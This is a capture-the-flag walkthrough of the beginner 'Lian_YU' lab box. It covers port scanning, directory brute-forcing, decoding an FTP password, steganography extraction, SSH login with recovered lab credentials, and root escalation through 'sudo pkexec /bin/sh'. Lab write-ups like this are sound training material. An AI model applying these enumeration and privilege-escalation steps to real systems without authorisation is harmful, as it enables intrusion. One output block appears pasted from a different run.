A beginner level security challenge.
Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

### nmap
```sh
21/tcp open ftp vsftpd 3.0.2
22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
| 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_ 256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp open http Apache httpd
|_http-server-header: Apache
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Purgatory
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4
111/tcp6 rpcbind
| 100000 3,4
111/udp6 rpcbind
| 100024 1
34537/tcp status
| 100024 1
50996/udp status
| 100024 1
58218/udp6 status
|_ 100024 1
59541/tcp6 status
34537/tcp open status 1 (RPC #100024)
```

### http_80
**ip**  `10.10.5.96`

To Do List
-------------------------------------
- Visit the site
- Surf around
- Vie source code
- Run Gobuster

#### The Site
![[Pasted image 20241029013931.png]]

The site and the source code has nothing much.
Also i ran `robots.txt` and got nothing.

### Gobuster
```sh
gobuster dir -u http://10.10.5.96 -w /usr/share/wordlists/dirb/common.txt
```

![[Pasted image 20241029014046.png]]

```sh
gobuster dir -u http://10.10.5.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt
```
![[Pasted image 20241029014117.png]]
`/island`
![[Pasted image 20241029014140.png]]

`/island/source code`
![[Pasted image 20241029014158.png]]

Here we get `vigilante`

### Gobuster /island

```sh
gobuster dir -u http://10.10.5.96/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt
```

![[Pasted image 20241029014319.png]]

Got the directory `/2100`

![[Pasted image 20241029014350.png]]

![[Pasted image 20241029014403.png]]
got a directory extension  `.ticket`

``Gobuster -x .tixket``

```sh
gobuster dir -u http://10.10.5.96/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt -x .ticket
```

```sh
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:
http://10.10.117.94
[+] Method:
GET
[+] Threads:
10
[+] Wordlist:
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes: 404
[+] User Agent:
gobuster/3.5
[+] Extensions:
ticket
[+] Timeout:
10s
===============================================================
2023/10/01 20:06:41 Starting gobuster in directory enumeration mode
===============================================================
Progress: 20244 / 441122 (17.59%)
/green_arrow.ticket (Status: 200) [Size: 71]
===============================================================
2023/10/01 20:17:28 Finished
===============================================================
```

`/green_arrow.tcket`

```sh
curl http://10.10.5.96/island/2100/green_arrow.ticket
```
- This is just a token to get into Queen's Gambit(Ship)
`RTy8yhBQdscX`

I copied ‘RTy8yhBQdscX’ and used an online tool to identify the hash.
It turns out that the text was encoded with base58. so i opened cyberchef.   `!#th3h00d `

### ftp_21

username  `vigilante`
password  `!#th3h00d`

 ```sh
ftp 10.10.5.96
```

From the FTP server i was able to get some files
• aa.jpg
• Leave_me_alone.png
• Queenâ€™s_Gambit.png
• .other_user

![[Pasted image 20241029015009.png]]

After checking the flies with binwalk i noticed that Leave_me_alone.png has a file format error.

I tried to correct the error since it was a `.png` file. The first 16 digits magic number of a .png file is `89 50 4E 47 0D 0A 1A 0A`.

I edited the magic number of Leave_me_alone.png
using `Hexedit` and see if the error would be corrected.
![[Pasted image 20241029015147.png]]

After i edited the magic numbers i used binwalk to look at it again and now the error is gone.
I opened Leave_me_alone.png to check the content.
![[Pasted image 20241029015222.png]]

I used `stegseek` to see if there are any hidden files in all the files i got from the ftp server.
![[Pasted image 20241029015248.png]]

I found out that there is an hidden file `ss.zip` inside `aa.jpg`.

The content of Leave_me_alone.png is the passphrase to extract the hidden contents in aa.jpg using `steghide` or any other stenography tool.

The hidden file is a .zip file. i extracted the content using unzip.
![[Pasted image 20241029015416.png]]

###  ssh_22

#### Details

Open ssh port = `22`
username = `slade`
password = `M3tahuman`

```sh
 ssh slade@10.10.5.96
```
![[Pasted image 20241029015550.png]]

Now we can read the user flag easily.
![[Pasted image 20241029015622.png]]


### Privilege Escalation
#### To Do List
sudo -l
cat /etc/crontab
find / -perm -u=s -type f 2>/dev/null

![[Pasted image 20241029015731.png]]

After checking the sudoers it shows that i can use /usr/bin/pkexec to escalate my privilege since it is the sudoers file.

I checked gtfobins to see how i would use it.
```sh
sudo pkexec /bin/sh
```
![[Pasted image 20241029015810.png]]

**THAT'S IT FOR THE ROOM!!!**
